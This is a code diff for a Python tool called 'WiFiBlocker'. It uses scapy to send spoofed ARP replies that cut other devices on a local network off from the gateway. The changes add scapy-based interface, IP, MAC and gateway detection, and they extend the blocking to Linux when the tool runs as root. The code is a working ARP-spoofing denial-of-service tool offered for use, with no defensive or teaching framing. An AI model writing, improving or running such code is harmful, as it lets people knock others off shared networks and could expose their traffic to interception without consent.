@@ -83,7 +83,7 @@ NPCAP_INSTALLED = check_npcap()
 import warnings
 warnings.filterwarnings("ignore")
 
-from scapy.all import ARP, send, conf
+from scapy.all import ARP, send, conf, get_if_hwaddr
 conf.verb = 0  # Disable scapy verbosity
 
 
@@ -97,6 +97,7 @@ class WiFiBlocker:
         self.gateway_mac = None
         self.my_ip = None
         self.my_mac = None
+        self.interface = None
         self.blocked_devices = {}  # {ip: {"mac": mac, "thread": thread, "active": bool, "success": bool}}
         self.running = True
         self.cached_devices = []
@@ -129,19 +130,52 @@ class WiFiBlocker:
         print("[*] Detecting network configuration...")
         
         try:
-            # Get own IP
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            self.my_ip = s.getsockname()[0]
-            s.close()
+            # 1. Detect active interface and default route via Scapy
+            try:
+                route_info = conf.route.route("0.0.0.0")
+                if route_info and len(route_info) >= 3:
+                    self.interface = route_info[0]
+                    self.my_ip = route_info[1]
+                    if route_info[2] and route_info[2] != "0.0.0.0":
+                        self.gateway_ip = route_info[2]
+            except Exception:
+                pass
+
+            # 2. Fallback IP detection
+            if not self.my_ip:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.connect(("8.8.8.8", 80))
+                self.my_ip = s.getsockname()[0]
+                s.close()
+
+            # 3. Detect real hardware MAC
+            if self.interface:
+                try:
+                    hw = get_if_hwaddr(self.interface)
+                    if hw and hw != "00:00:00:00:00:00":
+                        self.my_mac = hw.upper()
+                except Exception:
+                    pass
+
+            if not self.my_mac and self.interface and os.name != 'nt':
+                try:
+                    sys_mac_path = f"/sys/class/net/{self.interface}/address"
+                    if os.path.exists(sys_mac_path):
+                        with open(sys_mac_path, "r") as f:
+                            mac_str = f.read().strip()
+                            if mac_str:
+                                self.my_mac = mac_str.upper()
+                except Exception:
+                    pass
+
+            if not self.my_mac:
+                mac_int = uuid.getnode()
+                mac_hex = "{:012x}".format(mac_int)
+                self.my_mac = ":".join(mac_hex[i:i+2] for i in range(0, 12, 2)).upper()
             
-            # Get own MAC
-            mac_int = uuid.getnode()
-            mac_hex = "{:012x}".format(mac_int)
-            self.my_mac = ":".join(mac_hex[i:i+2] for i in range(0, 12, 2)).upper()
-            
-            # Detect gateway IP
-            self.gateway_ip = self._get_gateway_ip()
+            # 4. Detect gateway IP if not already found via Scapy
+            if not self.gateway_ip:
+                self.gateway_ip = self._get_gateway_ip()
             
             # Ping gateway to ensure it's in ARP cache
             self._ping_host(self.gateway_ip)
@@ -150,19 +184,25 @@ class WiFiBlocker:
             # Get gateway MAC from ARP cache
             self.gateway_mac = self._get_mac_from_arp_cache(self.gateway_ip)
             
+            iface_str = f" [{self.interface}]" if self.interface else ""
             print(f"[+] Your IP: {self.my_ip}")
-            print(f"[+] Your MAC: {self.my_mac}")
+            print(f"[+] Your MAC: {self.my_mac}{iface_str}")
             print(f"[+] Gateway IP: {self.gateway_ip}")
             print(f"[+] Gateway MAC: {self.gateway_mac if self.gateway_mac else 'Unknown'}")
             
-            if self.npcap_available:
-                print("[+] Npcap: Installed - Blocking enabled")
+            if os.name == 'nt':
+                if self.npcap_available:
+                    print("[+] Npcap: Installed - Blocking enabled")
+                else:
+                    print("[!] Npcap: NOT installed - Blocking disabled")
             else:
-                print("[!] Npcap: NOT installed - Blocking disabled")
+                if self.has_admin:
+                    print("[+] Linux Raw Sockets: Available (Root) - Blocking enabled")
+                else:
+                    print("[!] Linux Raw Sockets: Root privileges required for blocking")
             
         except Exception as e:
-            print(f"[-] Error detecting network: {e}")
-            sys.exit(1)
+            print(f"[-] Warning during network detection: {e}")
     
     def _ping_host(self, ip):
         """Ping a single host."""
@@ -343,7 +383,9 @@ class WiFiBlocker:
     
     def _send_arp_spoof(self, target_ip, target_mac, spoof_ip):
         """Send ARP spoof packet. Returns True on success."""
-        if not self.npcap_available:
+        if os.name == 'nt' and not self.npcap_available:
+            return False
+        if os.name != 'nt' and not self.has_admin:
             return False
         
         try:
@@ -353,7 +395,10 @@ class WiFiBlocker:
                 hwdst=target_mac,
                 psrc=spoof_ip
             )
-            send(arp_response, verbose=0)
+            if self.interface:
+                send(arp_response, iface=self.interface, verbose=0)
+            else:
+                send(arp_response, verbose=0)
             return True
         except Exception:
             return False
@@ -387,8 +432,10 @@ class WiFiBlocker:
     
     def block_device(self, target_ip, silent=False):
         """Start blocking a device. Returns (success, message)."""
-        if not self.npcap_available:
+        if os.name == 'nt' and not self.npcap_available:
             return (False, "Npcap not installed")
+        if os.name != 'nt' and not self.has_admin:
+            return (False, "Root privileges required")
         
         if target_ip == self.gateway_ip:
             return (False, "Cannot block gateway")
@@ -432,9 +479,13 @@ class WiFiBlocker:
             print("[-] Please scan for devices first (option 1).")
             return
         
-        if not self.npcap_available:
+        if os.name == 'nt' and not self.npcap_available:
             print("[-] Cannot block devices: Npcap is not installed!")
             print("    Please install Npcap from: https://npcap.com/#download")
+            return
+        if os.name != 'nt' and not self.has_admin:
+            print("[-] Cannot block devices: Root privileges required on Linux!")
+            print("    Please run with: sudo python3 main.py")
             return
         
         results = []
